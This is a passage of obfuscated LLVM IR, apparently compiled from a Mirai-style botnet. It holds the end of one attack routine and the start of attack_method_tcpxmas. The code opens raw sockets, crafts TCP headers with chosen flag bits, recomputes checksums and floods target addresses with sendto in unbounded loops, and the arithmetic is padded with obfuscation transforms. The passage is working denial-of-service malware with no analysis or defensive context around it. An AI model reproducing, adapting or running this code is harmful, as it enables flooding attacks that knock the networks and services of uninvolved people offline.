  %611 = xor i16 %607, -1
  %612 = xor i16 1, -1
  %613 = xor i16 23805, -1
  %614 = or i16 %611, %612
  %615 = or i16 23805, %613
  %616 = xor i16 %614, -1
  %617 = and i16 %616, %615
  %618 = and i16 %607, 1
  %619 = shl i16 %617, 10
  %620 = xor i16 -1025, -1
  %621 = xor i16 %610, %620
  %622 = and i16 %621, %610
  %623 = and i16 %610, -1025
  %624 = and i16 %622, %619
  %625 = xor i16 %622, %619
  %626 = or i16 %624, %625
  %627 = or i16 %622, %619
  store i16 %626, i16* %609, align 4
  %628 = load i8, i8* %22, align 1
  %629 = sext i8 %628 to i16
  %630 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 4
  %632 = load i16, i16* %631, align 4
  %633 = xor i16 1, -1
  %634 = xor i16 %629, %633
  %635 = and i16 %634, %629
  %636 = and i16 %629, 1
  %637 = shl i16 %635, 9
  %638 = xor i16 %632, -1
  %639 = xor i16 -513, -1
  %640 = xor i16 17283, -1
  %641 = or i16 %638, %639
  %642 = or i16 17283, %640
  %643 = xor i16 %641, -1
  %644 = and i16 %643, %642
  %645 = and i16 %632, -513
  %646 = xor i16 %644, -1
  %647 = xor i16 %637, -1
  %648 = xor i16 -28639, -1
  %649 = and i16 %646, -28639
  %650 = and i16 %644, %648
  %651 = and i16 %647, -28639
  %652 = and i16 %637, %648
  %653 = or i16 %649, %650
  %654 = or i16 %651, %652
  %655 = xor i16 %653, %654
  %656 = or i16 %646, %647
  %657 = xor i16 %656, -1
  %658 = or i16 -28639, %648
  %659 = and i16 %657, %658
  %660 = or i16 %655, %659
  %661 = or i16 %644, %637
  store i16 %660, i16* %631, align 4
  %662 = load i8, i8* %23, align 1
  %663 = sext i8 %662 to i16
  %664 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %665 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %664, i32 0, i32 4
  %666 = load i16, i16* %665, align 4
  %667 = xor i16 %663, -1
  %668 = xor i16 1, -1
  %669 = xor i16 -27643, -1
  %670 = or i16 %667, %668
  %671 = or i16 -27643, %669
  %672 = xor i16 %670, -1
  %673 = and i16 %672, %671
  %674 = and i16 %663, 1
  %675 = shl i16 %673, 8
  %676 = xor i16 -257, -1
  %677 = xor i16 %666, %676
  %678 = and i16 %677, %666
  %679 = and i16 %666, -257
  %680 = xor i16 %678, -1
  %681 = xor i16 %675, -1
  %682 = xor i16 -16350, -1
  %683 = and i16 %680, -16350
  %684 = and i16 %678, %682
  %685 = and i16 %681, -16350
  %686 = and i16 %675, %682
  %687 = or i16 %683, %684
  %688 = or i16 %685, %686
  %689 = xor i16 %687, %688
  %690 = or i16 %680, %681
  %691 = xor i16 %690, -1
  %692 = or i16 -16350, %682
  %693 = and i16 %691, %692
  %694 = or i16 %689, %693
  %695 = or i16 %678, %675
  store i16 %694, i16* %665, align 4
  %696 = load i8*, i8** %38, align 8
  %697 = load i32, i32* %24, align 4
  call void @rand_str(i8* %696, i32 %697)
  br label %746

; <label>:698:                                    ; preds = %251, %240
  %699 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %700 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %699, i32 0, i32 4
  %701 = load i16, i16* %700, align 4
  %702 = lshr i16 %701, 8
  %703 = xor i16 %702, -1
  %704 = xor i16 1, -1
  %705 = xor i16 -17310, -1
  %706 = or i16 %703, %704
  %707 = or i16 -17310, %705
  %708 = xor i16 %706, -1
  %709 = and i16 %708, %707
  %710 = and i16 %702, 1
  %711 = zext i16 %709 to i32
  %712 = icmp ne i32 %711, 0
  br i1 %712, label %728, label %713

; <label>:713:                                    ; preds = %698
  %714 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %715 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %714, i32 0, i32 4
  %716 = load i16, i16* %715, align 4
  %717 = lshr i16 %716, 10
  %718 = xor i16 %717, -1
  %719 = xor i16 1, -1
  %720 = xor i16 -30636, -1
  %721 = or i16 %718, %719
  %722 = or i16 -30636, %720
  %723 = xor i16 %721, -1
  %724 = and i16 %723, %722
  %725 = and i16 %717, 1
  %726 = zext i16 %724 to i32
  %727 = icmp ne i32 %726, 0
  br i1 %727, label %728, label %731

; <label>:728:                                    ; preds = %713, %698
  %729 = load i32, i32* %26, align 4
  %730 = call i32 @close(i32 %729)
  br label %121

; <label>:731:                                    ; preds = %713
  br label %732

; <label>:732:                                    ; preds = %731
  br label %733

; <label>:733:                                    ; preds = %732, %228
  br label %734

; <label>:734:                                    ; preds = %733, %224, %216
  %735 = call i64 @time(i64* null) #6
  %736 = load i64, i64* %31, align 8
  %737 = sub i64 %735, -4079780923393551367
  %738 = sub i64 %737, %736
  %739 = add i64 %738, -4079780923393551367
  %740 = sub nsw i64 %735, %736
  %741 = icmp sgt i64 %739, 10
  br i1 %741, label %742, label %745

; <label>:742:                                    ; preds = %734
  %743 = load i32, i32* %26, align 4
  %744 = call i32 @close(i32 %743)
  br label %121

; <label>:745:                                    ; preds = %734
  br label %204

; <label>:746:                                    ; preds = %409
  br label %747

; <label>:747:                                    ; preds = %746, %124
  %748 = load i32, i32* %9, align 4
  %749 = sub i32 0, %748
  %750 = sub i32 0, 1
  %751 = add i32 %749, %750
  %752 = sub i32 0, %751
  %753 = add nsw i32 %748, 1
  store i32 %752, i32* %9, align 4
  br label %115

; <label>:754:                                    ; preds = %115
  br label %755

; <label>:755:                                    ; preds = %885, %754
  store i32 0, i32* %9, align 4
  br label %756

; <label>:756:                                    ; preds = %880, %755
  %757 = load i32, i32* %9, align 4
  %758 = load i8, i8* %5, align 1
  %759 = zext i8 %758 to i32
  %760 = icmp slt i32 %757, %759
  br i1 %760, label %761, label %885

; <label>:761:                                    ; preds = %756
  %762 = load i8**, i8*** %12, align 8
  %763 = load i32, i32* %9, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds i8*, i8** %762, i64 %764
  %766 = load i8*, i8** %765, align 8
  store i8* %766, i8** %39, align 8
  %767 = load i8*, i8** %39, align 8
  %768 = bitcast i8* %767 to %struct.iphdr*
  store %struct.iphdr* %768, %struct.iphdr** %40, align 8
  %769 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i64 1
  %771 = bitcast %struct.iphdr* %770 to %struct.tcphdr*
  store %struct.tcphdr* %771, %struct.tcphdr** %41, align 8
  %772 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %773 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %772, i64 1
  %774 = bitcast %struct.tcphdr* %773 to i8*
  store i8* %774, i8** %42, align 8
  %775 = load i16, i16* %14, align 2
  %776 = zext i16 %775 to i32
  %777 = icmp eq i32 %776, 65535
  br i1 %777, label %778, label %791

; <label>:778:                                    ; preds = %761
  %779 = call i32 @rand_next()
  %780 = xor i32 %779, -1
  %781 = xor i32 65535, -1
  %782 = xor i32 1307733273, -1
  %783 = or i32 %780, %781
  %784 = or i32 1307733273, %782
  %785 = xor i32 %783, -1
  %786 = and i32 %785, %784
  %787 = and i32 %779, 65535
  %788 = trunc i32 %786 to i16
  %789 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %790 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %789, i32 0, i32 3
  store i16 %788, i16* %790, align 4
  br label %791

; <label>:791:                                    ; preds = %778, %761
  %792 = load i8, i8* %25, align 1
  %793 = icmp ne i8 %792, 0
  br i1 %793, label %794, label %797

; <label>:794:                                    ; preds = %791
  %795 = load i8*, i8** %42, align 8
  %796 = load i32, i32* %24, align 4
  call void @rand_str(i8* %795, i32 %796)
  br label %797

; <label>:797:                                    ; preds = %794, %791
  %798 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %799 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %798, i32 0, i32 7
  store i16 0, i16* %799, align 2
  %800 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %801 = bitcast %struct.iphdr* %800 to i16*
  %802 = call zeroext i16 @checksum_generic(i16* %801, i32 20)
  %803 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %804 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %803, i32 0, i32 7
  store i16 %802, i16* %804, align 2
  %805 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %806 = load i32, i32* %9, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %805, i64 %807
  %809 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %808, i32 0, i32 1
  %810 = load i32, i32* %809, align 4
  %811 = sub i32 %810, 2043711015
  %812 = add i32 %811, 1
  %813 = add i32 %812, 2043711015
  %814 = add i32 %810, 1
  store i32 %813, i32* %809, align 4
  %815 = trunc i32 %810 to i16
  %816 = call zeroext i16 @htons(i16 zeroext %815) #7
  %817 = zext i16 %816 to i32
  %818 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %819 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %818, i32 0, i32 2
  store i32 %817, i32* %819, align 4
  %820 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %821 = load i32, i32* %9, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %820, i64 %822
  %824 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %823, i32 0, i32 2
  %825 = load i32, i32* %824, align 4
  %826 = trunc i32 %825 to i16
  %827 = call zeroext i16 @htons(i16 zeroext %826) #7
  %828 = zext i16 %827 to i32
  %829 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %830 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %829, i32 0, i32 3
  store i32 %828, i32* %830, align 4
  %831 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %832 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %831, i32 0, i32 6
  store i16 0, i16* %832, align 4
  %833 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %834 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %835 = bitcast %struct.tcphdr* %834 to i8*
  %836 = load i32, i32* %24, align 4
  %837 = sext i32 %836 to i64
  %838 = sub i64 0, %837
  %839 = sub i64 20, %838
  %840 = add i64 20, %837
  %841 = trunc i64 %839 to i16
  %842 = call zeroext i16 @htons(i16 zeroext %841) #7
  %843 = load i32, i32* %24, align 4
  %844 = sext i32 %843 to i64
  %845 = sub i64 20, 194164509581432330
  %846 = add i64 %845, %844
  %847 = add i64 %846, 194164509581432330
  %848 = add i64 20, %844
  %849 = trunc i64 %847 to i32
  %850 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %833, i8* %835, i16 zeroext %842, i32 %849)
  %851 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %852 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %851, i32 0, i32 6
  store i16 %850, i16* %852, align 4
  %853 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %854 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %853, i32 0, i32 1
  %855 = load i16, i16* %854, align 2
  %856 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %857 = load i32, i32* %9, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %856, i64 %858
  %860 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %859, i32 0, i32 0
  %861 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %860, i32 0, i32 1
  store i16 %855, i16* %861, align 2
  %862 = load i32, i32* %10, align 4
  %863 = load i8*, i8** %39, align 8
  %864 = load i32, i32* %24, align 4
  %865 = sext i32 %864 to i64
  %866 = sub i64 40, -2854177236856301894
  %867 = add i64 %866, %865
  %868 = add i64 %867, -2854177236856301894
  %869 = add i64 40, %865
  %870 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %871 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %872 = load i32, i32* %9, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %871, i64 %873
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %874, i32 0, i32 0
  %876 = bitcast %struct.sockaddr_in* %875 to %struct.sockaddr*
  store %struct.sockaddr* %876, %struct.sockaddr** %870, align 8
  %877 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %878 = load %struct.sockaddr*, %struct.sockaddr** %877, align 8
  %879 = call i64 @sendto(i32 %862, i8* %863, i64 %868, i32 16384, %struct.sockaddr* %878, i32 16)
  br label %880

; <label>:880:                                    ; preds = %797
  %881 = load i32, i32* %9, align 4
  %882 = sub i32 0, 1
  %883 = sub i32 %881, %882
  %884 = add nsw i32 %881, 1
  store i32 %883, i32* %9, align 4
  br label %756

; <label>:885:                                    ; preds = %756
  br label %755

; <label>:886:                                    ; preds = %215, %111, %105
  ret void
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %860

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %860

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %725, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %730

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %720, %707, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %725

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 %150, 8970113
  %161 = add i32 %160, %159
  %162 = add i32 %161, 8970113
  %163 = add i32 %150, %159
  %164 = call i32 @htonl(i32 %162) #7
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  br label %176

; <label>:167:                                    ; preds = %125
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %167, %143
  %177 = load i16, i16* %17, align 2
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 65535
  br i1 %179, label %180, label %192

; <label>:180:                                    ; preds = %176
  %181 = call i32 @rand_next()
  %182 = xor i32 %181, -1
  %183 = xor i32 65535, -1
  %184 = xor i32 412494662, -1
  %185 = or i32 %182, %183
  %186 = or i32 412494662, %184
  %187 = xor i32 %185, -1
  %188 = and i32 %187, %186
  %189 = and i32 %181, 65535
  %190 = trunc i32 %188 to i16
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  br label %196

; <label>:192:                                    ; preds = %176
  %193 = load i16, i16* %17, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %180
  %197 = load i32, i32* %26, align 4
  %198 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %199 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %199, %struct.sockaddr** %198, align 8
  %200 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %201 = load %struct.sockaddr*, %struct.sockaddr** %200, align 8
  %202 = call i32 @connect(i32 %197, %struct.sockaddr* %201, i32 16)
  %203 = call i64 @time(i64* null) #6
  store i64 %203, i64* %31, align 8
  br label %204

; <label>:204:                                    ; preds = %723, %196
  store i32 16, i32* %29, align 4
  %205 = load i32, i32* %10, align 4
  %206 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i64 @recvfrom(i32 %205, i8* %206, i64 256, i32 16384, %struct.sockaddr* %210, i32* %29)
  %212 = trunc i64 %211 to i32
  store i32 %212, i32* %33, align 4
  %213 = load i32, i32* %33, align 4
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %204
  br label %860

; <label>:216:                                    ; preds = %204
  %217 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %218 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %221 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 4
  %223 = icmp eq i32 %219, %222
  br i1 %223, label %224, label %713

; <label>:224:                                    ; preds = %216
  %225 = load i32, i32* %33, align 4
  %226 = sext i32 %225 to i64
  %227 = icmp ugt i64 %226, 40
  br i1 %227, label %228, label %713

; <label>:228:                                    ; preds = %224
  %229 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %230 = getelementptr inbounds i8, i8* %229, i64 20
  %231 = bitcast i8* %230 to %struct.tcphdr*
  store %struct.tcphdr* %231, %struct.tcphdr** %35, align 8
  %232 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = load i16, i16* %233, align 4
  %235 = zext i16 %234 to i32
  %236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %235, %238
  br i1 %239, label %240, label %712

; <label>:240:                                    ; preds = %228
  %241 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = lshr i16 %243, 9
  %245 = xor i16 1, -1
  %246 = xor i16 %244, %245
  %247 = and i16 %246, %244
  %248 = and i16 %244, 1
  %249 = zext i16 %247 to i32
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %677

; <label>:251:                                    ; preds = %240
  %252 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = lshr i16 %254, 12
  %256 = xor i16 1, -1
  %257 = xor i16 %255, %256
  %258 = and i16 %257, %255
  %259 = and i16 %255, 1
  %260 = zext i16 %258 to i32
  %261 = icmp ne i32 %260, 0
  br i1 %261, label %262, label %677

; <label>:262:                                    ; preds = %251
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %264 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 4
  %266 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %267 = load i32, i32* %9, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %266, i64 %268
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %269, i32 0, i32 0
  store i32 %265, i32* %270, align 4
  %271 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 2
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %276 = load i32, i32* %9, align 4
